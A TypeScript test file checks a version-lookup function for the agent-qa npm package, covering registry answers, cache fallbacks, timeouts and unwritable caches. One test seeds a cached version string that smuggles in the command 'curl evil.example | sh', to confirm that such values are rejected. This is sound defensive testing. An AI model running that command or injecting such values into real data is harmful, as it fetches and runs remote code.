import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { mkdir, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { askLatestAgentQaVersion, getAgentQaVersionCheckCachePath } from '../index.js'

const now = new Date('2026-05-24T10:00:00.000Z')
const yearOldCheckedAt = '2025-05-24T10:00:00.000Z'

function registryAnswer(latest: unknown, init?: ResponseInit): Response {
  return new Response(JSON.stringify({ 'dist-tags': { latest } }), {
    status: 200,
    headers: { 'content-type': 'application/json' },
    ...init,
  })
}

describe('askLatestAgentQaVersion', () => {
  let homeDir: string
  let cachePath: string

  beforeEach(async () => {
    homeDir = await mkdtemp(join(tmpdir(), 'agent-qa-latest-ask-'))
    cachePath = getAgentQaVersionCheckCachePath(homeDir)
  })

  afterEach(async () => {
    await rm(homeDir, { recursive: true, force: true })
  })

  async function seedCache(cache: Record<string, unknown>): Promise<string> {
    await mkdir(join(homeDir, '.agent-qa'), { recursive: true })
    const text = JSON.stringify(cache, null, 2)
    await writeFile(cachePath, text, 'utf-8')
    return text
  }

  async function cacheText(): Promise<string | undefined> {
    try {
      return await readFile(cachePath, 'utf-8')
    } catch {
      return undefined
    }
  }

  it('a registry answer is returned and written back to the cache, keeping its other fields', async () => {
    await seedCache({
      latestVersion: '0.3.0',
      checkedAt: yearOldCheckedAt,
      refreshStartedAt: yearOldCheckedAt,
    })
    const fetchImpl = vi.fn(async (_input: string | URL | Request, _init?: RequestInit) =>
      registryAnswer('0.4.0'),
    )

    const answer = await askLatestAgentQaVersion({
      homeDir,
      fetchImpl,
      timeoutMs: 1500,
      now: () => now,
    })

    expect(answer).toEqual({ source: 'registry', latestVersion: '0.4.0' })
    expect(fetchImpl).toHaveBeenCalledTimes(1)
    expect(fetchImpl.mock.calls[0]?.[0]).toBe('https://registry.npmjs.org/agent-qa')
    expect(JSON.parse((await cacheText()) ?? '{}')).toEqual({
      latestVersion: '0.4.0',
      checkedAt: now.toISOString(),
      lastAttemptedAt: now.toISOString(),
      refreshStartedAt: yearOldCheckedAt,
    })
  })

  it('a registry answer with no cache file creates one', async () => {
    const answer = await askLatestAgentQaVersion({
      homeDir,
      fetchImpl: async () => registryAnswer('0.4.0'),
      timeoutMs: 1500,
      now: () => now,
    })

    expect(answer).toEqual({ source: 'registry', latestVersion: '0.4.0' })
    expect(JSON.parse((await cacheText()) ?? '{}')).toEqual({
      latestVersion: '0.4.0',
      checkedAt: now.toISOString(),
      lastAttemptedAt: now.toISOString(),
    })
  })

  const failedAsks: [string, (input: unknown, init?: RequestInit) => Promise<Response>][] = [
    [
      'a rejected request',
      async () => {
        throw new Error('getaddrinfo ENOTFOUND registry.npmjs.org')
      },
    ],
    ['a non-2xx answer', async () => registryAnswer('0.4.0', { status: 503 })],
    ['a latest that is not semver', async () => registryAnswer('https://evil.example/0.4.0')],
    ['a request that never answers', () => new Promise<Response>(() => {})],
  ]

  for (const [label, fetchImpl] of failedAsks) {
    it(`${label} falls back to the cached latest version, whatever its age, and writes nothing`, async () => {
      const seeded = await seedCache({ latestVersion: '0.3.9', checkedAt: yearOldCheckedAt })

      const answer = await askLatestAgentQaVersion({
        homeDir,
        fetchImpl,
        timeoutMs: 50,
        now: () => now,
      })

      expect(answer).toEqual({ source: 'cache', latestVersion: '0.3.9' })
      expect(await cacheText()).toBe(seeded)
    })

    it(`${label} with no cached answer gives none and creates no cache file`, async () => {
      const answer = await askLatestAgentQaVersion({
        homeDir,
        fetchImpl,
        timeoutMs: 50,
        now: () => now,
      })

      expect(answer).toEqual({ source: 'none' })
      expect(await cacheText()).toBeUndefined()
    })
  }

  it('a request that never answers is given up at the deadline', async () => {
    const started = Date.now()
    await askLatestAgentQaVersion({
      homeDir,
      fetchImpl: () => new Promise<Response>(() => {}),
      timeoutMs: 50,
      now: () => now,
    })
    expect(Date.now() - started).toBeLessThan(1000)
  })

  it('a crafted cached latest version that is not semver gives none', async () => {
    const seeded = await seedCache({
      latestVersion: '0.4.0; curl evil.example | sh',
      checkedAt: yearOldCheckedAt,
    })

    const answer = await askLatestAgentQaVersion({
      homeDir,
      fetchImpl: async () => {
        throw new Error('offline')
      },
      timeoutMs: 50,
      now: () => now,
    })

    expect(answer).toEqual({ source: 'none' })
    expect(await cacheText()).toBe(seeded)
  })

  it('a fetch that throws before returning a promise falls back without throwing', async () => {
    await seedCache({ latestVersion: '0.3.9' })

    const answer = await askLatestAgentQaVersion({
      homeDir,
      fetchImpl: () => {
        throw new TypeError('fetch is broken')
      },
      timeoutMs: 50,
      now: () => now,
    })

    expect(answer).toEqual({ source: 'cache', latestVersion: '0.3.9' })
  })

  it('a registry answer whose cache cannot be written is still returned', async () => {
    const fileAsHome = join(homeDir, 'not-a-folder')
    await writeFile(fileAsHome, '', 'utf-8')

    const answer = await askLatestAgentQaVersion({
      homeDir: fileAsHome,
      fetchImpl: async () => registryAnswer('0.4.0'),
      timeoutMs: 1500,
      now: () => now,
    })

    expect(answer).toEqual({ source: 'registry', latestVersion: '0.4.0' })
  })
})
